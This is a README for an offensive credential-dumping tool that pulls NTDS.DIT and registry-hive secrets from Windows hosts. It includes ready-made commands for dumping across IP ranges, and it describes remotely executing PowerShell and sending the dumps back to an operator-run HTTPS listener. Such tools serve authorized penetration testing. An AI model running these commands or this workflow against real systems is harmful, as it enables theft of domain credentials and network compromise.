# secretsdump-ng

Credential dumping tool that uses DSInternals for extracting credentials from Windows systems, using any available command-execution port.

## Features

- **NTDS.DIT extraction** using DSInternals on Domain Controllers
- **Registry hive dumping** (SAM, SYSTEM, SECURITY) on all Windows systems
- **Multi-threaded** operations for dumping from multiple hosts
- **Secure transfer of credentials** via HTTPS
- **Formatted output** compatible with standard secretsdump format
- **Filtered extraction** - dump only specific users with `--just-dc-user`

## Installation

```bash
pip install secretsdump-ng
```

### Additional Requirements

You'll also need `exec_across_windows.py` in your working directory or PATH.

System requirements:
- `openssl` (for generating SSL certificates)
- `wget` (for downloading DSInternals)
- Valid domain credentials with appropriate privileges

## Usage

```bash
# Dump all credentials from a single host
secretsdump-ng 192.168.1.10 username password

# Dump from multiple hosts using IP range
secretsdump-ng 192.168.1.10-20 username password

# Dump only a specific user
secretsdump-ng 192.168.1.10 username password --just-dc-user administrator

# Use more threads for faster scanning
secretsdump-ng 192.168.1.1-254 username password --threads 20

# Verbose output
secretsdump-ng 192.168.1.10 username password -v
```

## How It Works

1. **Sets up HTTPS server** on port 1338 to receive credential dumps
2. **Executes PowerShell remotely** on target systems using `exec_across_windows.py`
3. **Extracts registry hives** (SAM, SYSTEM, SECURITY) from all Windows systems
4. **Extracts NTDS.DIT** using DSInternals on Domain Controllers
5. **Processes and formats** credentials using impacket-secretsdump
6. **Saves output** to `./secretsdump_ng_out/[IP]/secretsdump.out`


Admin accounts are highlighted with `(admin)` tag. Machine accounts are sorted to the bottom.

## Security Notes

- Uses temporary SSL certificates for HTTPS transfers
- Temporary files on target systems are stored in `$env:TEMP` and cleaned up after extraction

## License

MIT License - see LICENSE file for details

## Disclaimer

This tool is intended for authorized security assessments only. Ensure you have proper authorization before using this tool on any systems.